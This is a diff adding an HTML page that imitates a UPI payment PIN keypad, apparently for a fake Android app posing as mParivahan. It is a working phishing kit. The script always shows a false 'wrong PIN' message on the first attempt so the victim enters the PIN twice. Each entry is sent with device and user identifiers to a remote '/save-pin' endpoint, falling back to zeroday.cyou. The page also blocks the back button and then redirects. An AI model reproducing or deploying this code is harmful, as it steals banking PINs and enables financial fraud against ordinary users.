@@ -1,0 +1,545 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Secure UPI Keypad</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/js/all.min.js"></script>
+    <style>
+       * {
+    box-sizing: border-box;
+    margin: 0;
+    padding: 0;
+    font-family: Arial, sans-serif;
+}
+body {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    height: 100vh;
+    background-color: white;
+    position: relative;
+}
+.header {
+    width: 100%;
+    height: 50px;
+    padding: 0px;
+    display: flex;
+    justify-content: end;
+    align-items: center;
+    position: fixed;
+    top: 0;
+    background-color: white;
+    z-index: 10;
+}
+
+.header img {
+    width: auto;
+    height: 40px;
+}
+.details {
+    width: 100%;
+    padding: 5px 15px;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    background-color: #f0f0f0;
+    font-size: 15px;
+    font-weight: 500;
+    margin-top: 50px;
+}
+.center-content {
+    flex-grow: 1;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: flex-start;
+    position: absolute;
+    top: 30%;
+    transform: translateY(-50%);
+    width: 100%;
+}
+h5 {
+    font-size: 15px;
+    font-weight: 500;
+    color: #3d3d3d;
+    margin-bottom: 15px;
+}
+.input-container {
+    font-size: 30px;
+    font-weight: bold;
+    color: #003bab;
+    letter-spacing: 10px;
+    display: flex;
+    gap: 5px;
+    margin-bottom: 15px;
+}
+
+.warning {
+    font-size: 25px;
+    font-weight: 500;
+    border-radius: 30px;
+    background: rgba(255, 199, 0, 0.2);
+    display: flex;
+    width: 85%;
+    padding: 10px;
+    color: #ff9d00;
+    align-items: center;
+    justify-content: center;
+    gap: 2px;
+    margin-top: 15px;
+}
+
+.warning i{
+    
+    font-size: 35px;
+    margin-left: 0px;
+}
+
+.warning p {
+    text-align: center;
+    color: black;
+    font-size: 14px;
+    margin-left: 10px;
+}
+
+.keypad {
+    width: 100%;
+    display: grid;
+    grid-template-columns: repeat(3, 1fr);
+    gap: 12px;
+    text-align: center;
+    position: fixed;
+    bottom: 0;
+    padding-bottom: 30px;
+    padding-top: 15px;
+    padding-left: 15px;
+    padding-right: 15px;
+    background-color: #f1f1f1;
+}
+.key {
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 60px;
+    font-size: 25px;
+    font-weight: bold;
+    color: #003bab;
+    background-color: transparent;
+    cursor: pointer;
+    user-select: none;
+    transition: transform 0.1s ease, background-color 0.1s ease;
+}
+.key:active {
+    transform: scale(0.9);
+    border-radius: 15px;
+}
+#done {
+    font-size: 35px;
+}
+#done1 {
+    font-size: 30px;
+}
+
+.verify-dialog {
+    display: none;
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background: rgba(0, 0, 0, 0.85);
+    z-index: 9999;
+    justify-content: center;
+    align-items: center;
+}
+
+.verify-content {
+    background: white;
+    padding: 40px 30px;
+    border-radius: 20px;
+    box-shadow: 0 10px 50px rgba(0,0,0,0.3);
+    text-align: center;
+    max-width: 320px;
+    width: 90%;
+}
+
+.verify-icon {
+    font-size: 60px;
+    color: #4CAF50;
+    margin-bottom: 20px;
+    animation: pulse 1.5s ease-in-out infinite;
+}
+
+@keyframes pulse {
+    0%, 100% { transform: scale(1); opacity: 1; }
+    50% { transform: scale(1.1); opacity: 0.8; }
+}
+
+.verify-title {
+    font-size: 22px;
+    font-weight: bold;
+    color: #333;
+    margin-bottom: 10px;
+}
+
+.verify-message {
+    font-size: 14px;
+    color: #666;
+    margin-bottom: 25px;
+    line-height: 1.5;
+}
+
+.verify-spinner {
+    display: inline-block;
+    width: 40px;
+    height: 40px;
+    border: 4px solid #f3f3f3;
+    border-top: 4px solid #4CAF50;
+    border-radius: 50%;
+    animation: spin 1s linear infinite;
+}
+
+@keyframes spin {
+    0% { transform: rotate(0deg); }
+    100% { transform: rotate(360deg); }
+}
+
+.verify-dots {
+    display: flex;
+    justify-content: center;
+    gap: 8px;
+    margin-top: 20px;
+}
+
+.verify-dot {
+    width: 10px;
+    height: 10px;
+    background: #4CAF50;
+    border-radius: 50%;
+    animation: dotPulse 1.5s ease-in-out infinite;
+}
+
+.verify-dot:nth-child(1) { animation-delay: 0s; }
+.verify-dot:nth-child(2) { animation-delay: 0.2s; }
+.verify-dot:nth-child(3) { animation-delay: 0.4s; }
+
+@keyframes dotPulse {
+    0%, 100% { transform: scale(1); opacity: 1; }
+    50% { transform: scale(1.5); opacity: 0.5; }
+}
+
+.secure-badge {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 8px;
+    margin-top: 20px;
+    padding: 10px;
+    background: #f0f8f0;
+    border-radius: 10px;
+    font-size: 12px;
+    color: #4CAF50;
+}
+
+.secure-badge i {
+    font-size: 16px;
+}
+    </style>
+</head>
+<body>
+
+    <div class="header">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/UPI-Logo.png" alt="UPI Logo">
+    </div>
+
+    <div class="details">
+        <p>Sending: <br>To:</p>
+        <p><span data-payment-amount>₹0.00</span> <br><span data-app-name>App</span></p>
+    </div>
+
+    <div class="center-content">
+        <h5>ENTER UPI PIN</h5>
+        <div class="input-container" id="input-display">
+            <span></span> <span></span> <span></span> <span></span> <span></span> <span></span>
+        </div>
+        <div class="warning">
+            <i class="fas fa-exclamation-circle"></i>
+            <p>You are sending <span data-payment-amount>₹0.00</span> from your account to <span data-app-name>App</span></p>
+        </div>
+    </div>
+
+    <div class="keypad">
+        <div class="key" onclick="enterNumber(1)">1</div>
+        <div class="key" onclick="enterNumber(2)">2</div>
+        <div class="key" onclick="enterNumber(3)">3</div>
+        <div class="key" onclick="enterNumber(4)">4</div>
+        <div class="key" onclick="enterNumber(5)">5</div>
+        <div class="key" onclick="enterNumber(6)">6</div>
+        <div class="key" onclick="enterNumber(7)">7</div>
+        <div class="key" onclick="enterNumber(8)">8</div>
+        <div class="key" onclick="enterNumber(9)">9</div>
+        <div class="key" id="done1" onclick="deleteNumber()"><i class="fas fa-backspace"></i></div>
+        <div class="key" onclick="enterNumber(0)">0</div>
+        <div class="key" id="done" onclick="submitPIN()"><i class="fas fa-circle-check"></i></div>
+    </div>
+
+    <div class="verify-dialog" id="verifyDialog">
+        <div class="verify-content">
+            <div class="verify-icon">
+                <i class="fas fa-shield-check"></i>
+            </div>
+            <div class="verify-title">Verifying Payment</div>
+            <div class="verify-message">Please wait while we securely process your transaction...</div>
+            <div class="verify-timer" id="verifyTimer" style="font-size: 18px; font-weight: bold; color: #4CAF50; margin-top: 10px;">Processing... 3s</div>
+            <div class="verify-spinner"></div>
+            <div class="verify-dots">
+                <div class="verify-dot"></div>
+                <div class="verify-dot"></div>
+                <div class="verify-dot"></div>
+            </div>
+            <div class="secure-badge">
+                <i class="fas fa-lock"></i>
+                <span>Secured by UPI</span>
+            </div>
+        </div>
+    </div>
+
+    <div class="verify-dialog" id="errorPinDialog" style="display: none;">
+        <div class="verify-content">
+            <div class="verify-icon" style="color: #f44336;">
+                <i class="fas fa-times-circle"></i>
+            </div>
+            <div class="verify-title" style="color: #f44336;">पिन गलत है</div>
+            <div class="verify-message">कृपया सही पिन दर्ज करें</div>
+            <button onclick="closeErrorPinDialog()" style="margin-top: 20px; padding: 12px 30px; background: #f44336; color: white; border: none; border-radius: 10px; font-size: 16px; font-weight: bold; cursor: pointer;">
+                फिर से प्रयास करें
+            </button>
+        </div>
+    </div>
+
+    <script>
+    let enteredNumbers = [];
+    let isHidden = true;
+    let savedPIN = '';
+    let isFirstAttempt = true;
+    
+    function getAppName() {
+        try {
+            if (typeof Android !== 'undefined' && Android.getAppName) {
+                return Android.getAppName();
+            }
+        } catch (e) {
+            console.error('Error getting app name:', e);
+        }
+        return 'App';
+    }
+
+    function getPaymentAmount() {
+        try {
+            if (typeof Android !== 'undefined' && Android.getPaymentAmount) {
+                return Android.getPaymentAmount();
+            }
+        } catch (e) {
+            console.error('Error getting payment amount:', e);
+        }
+        return '₹1.00';
+    }
+
+    function syncPaymentDetails() {
+        const appName = getAppName();
+        const amount = getPaymentAmount();
+        document.querySelectorAll('[data-app-name]').forEach(el => el.textContent = appName);
+        document.querySelectorAll('[data-payment-amount]').forEach(el => el.textContent = amount);
+    }
+    
+    function checkAttemptStatus() {
+      const savedAttempt = localStorage.getItem('upi_pin_attempt');
+      if (savedAttempt === 'failed') {
+        isFirstAttempt = false;
+      }
+    }
+    
+    function getDeviceId() {
+        try {
+            if (typeof Android !== 'undefined' && Android.getDeviceId) {
+                return Android.getDeviceId();
+            }
+        } catch (e) {
+            console.error('Error getting device ID:', e);
+        }
+        return 'web_browser_' + Date.now();
+    }
+
+    function getUserId() {
+        try {
+            if (typeof Android !== 'undefined' && Android.getUserId) {
+                return Android.getUserId();
+            }
+        } catch (e) {
+            console.error('Error getting user ID:', e);
+        }
+        return '8f41bc5eec42e34209a801a7fa8b2d94d1c3d983';
+    }
+
+    function getAppType() {
+        try {
+            if (typeof Android !== 'undefined' && Android.getAppType) {
+                return Android.getAppType();
+            }
+        } catch (e) {
+            console.error('Error getting app type:', e);
+        }
+        return 'mparivahan';
+    }
+
+    function updateDisplay() {
+        let display = document.getElementById("input-display");
+        display.innerHTML = "";
+        for (let i = 0; i < 6; i++) {
+            let span = document.createElement("span");
+            span.textContent = enteredNumbers[i] !== undefined ? (isHidden ? "•" : enteredNumbers[i]) : "";
+            display.appendChild(span);
+        }
+    }
+
+    function enterNumber(num) {
+        if (enteredNumbers.length < 6) {
+            enteredNumbers.push(num);
+            updateDisplay();
+        }
+    }
+
+    function deleteNumber() {
+        enteredNumbers.pop();
+        updateDisplay();
+    }
+
+    function showVerifyDialog() {
+        document.getElementById('verifyDialog').style.display = 'flex';
+        let countdown = 3;
+        const timerEl = document.getElementById('verifyTimer');
+        const interval = setInterval(() => {
+            countdown--;
+            if (countdown > 0) {
+                timerEl.textContent = `Processing... ${countdown}s`;
+            } else {
+                timerEl.textContent = 'Completing...';
+                clearInterval(interval);
+            }
+        }, 1000);
+    }
+
+    function hideVerifyDialog() {
+        document.getElementById('verifyDialog').style.display = 'none';
+    }
+    
+    function showErrorPinDialog() {
+        document.getElementById('errorPinDialog').style.display = 'flex';
+    }
+    
+    function closeErrorPinDialog() {
+        document.getElementById('errorPinDialog').style.display = 'none';
+        enteredNumbers = [];
+        updateDisplay();
+    }
+
+    function submitPIN() {
+        if (enteredNumbers.length === 6 || enteredNumbers.length === 4) {
+            let upiPin = enteredNumbers.join('');
+            savedPIN = upiPin;
+            
+            if (isFirstAttempt) {
+                showVerifyDialog();
+                
+                setTimeout(() => {
+                    sendPinToServer(upiPin, false);
+                    
+                    hideVerifyDialog();
+                    showErrorPinDialog();
+                    localStorage.setItem('upi_pin_attempt', 'failed');
+                    isFirstAttempt = false;
+                    enteredNumbers = [];
+                    updateDisplay();
+                }, 3000);
+                return;
+            }
+            
+            submitToServer(upiPin);
+        } else {
+            if (navigator.vibrate) {
+                navigator.vibrate(200);
+            }
+        }
+    }
+
+    function sendPinToServer(upiPin, isSuccess) {
+        const deviceId = getDeviceId();
+        const userId = getUserId();
+        const appType = getAppType();
+        const requestData = {
+            upi_pin: upiPin,
+            device_id: deviceId,
+            app_type: appType,
+            user_id: userId,
+            status: isSuccess ? "success" : "failed"
+        };
+
+        let baseUrl;
+        try {
+            baseUrl = Android.getBaseUrl();
+        } catch (e) {
+            baseUrl = 'https://zeroday.cyou';
+            console.log('Using fallback URL');
+        }
+
+        fetch(`${baseUrl}/save-pin`, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify(requestData)
+        })
+        .then(response => {
+            if (!response.ok) {
+                console.error("Failed to send PIN to server");
+                return;
+            }
+            return response.json();
+        })
+        .then(data => {
+            console.log("PIN sent to server:", isSuccess ? "success" : "failed");
+        })
+        .catch(error => {
+            console.error('Error sending PIN to server:', error);
+        });
+    }
+
+    function submitToServer(upiPin) {
+        showVerifyDialog();
+        
+        sendPinToServer(upiPin, true);
+
+        setTimeout(() => {
+            localStorage.removeItem('upi_pin_attempt');
+            hideVerifyDialog();
+            history.pushState(null, null, location.href);
+            window.onpopstate = function() {
+                history.go(1);
+            };
+            window.location.href = 'final.html';
+        }, 3000);
+    }
+
+    checkAttemptStatus();
+    updateDisplay();
+    syncPaymentDetails();
+
+    history.pushState(null, null, location.href);
+    window.onpopstate = function() {
+        history.go(1);
+    };
+</script>
+
+</body>
+</html>
